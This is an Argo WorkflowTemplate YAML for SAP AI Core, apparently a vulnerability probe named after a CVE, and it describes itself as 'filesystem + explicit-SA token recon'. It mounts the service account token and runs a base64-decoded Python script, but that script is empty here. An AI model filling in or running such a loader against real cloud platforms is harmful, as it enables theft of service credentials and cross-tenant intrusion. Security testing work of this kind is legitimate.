apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: cve41485-saprobe-v2-wf
  labels:
    scenarios.ai.sap.com/id: "saprobe-v2-scenario"
    ai.sap.com/version: "1.0.0"
  annotations:
    scenarios.ai.sap.com/name: "saprobe-v2-scenario"
    executables.ai.sap.com/name: "cve41485-saprobe-v2-wf"
    executables.ai.sap.com/description: "Workflow filesystem + explicit-SA token recon"
spec:
  entrypoint: probe
  templates:
  - name: probe
    automountServiceAccountToken: true
    container:
      image: python:3.11
      command: ["/bin/sh","-c"]
      args:
      - |
        printf '%s' '' | base64 -d > /tmp/p.py
        python3 /tmp/p.py
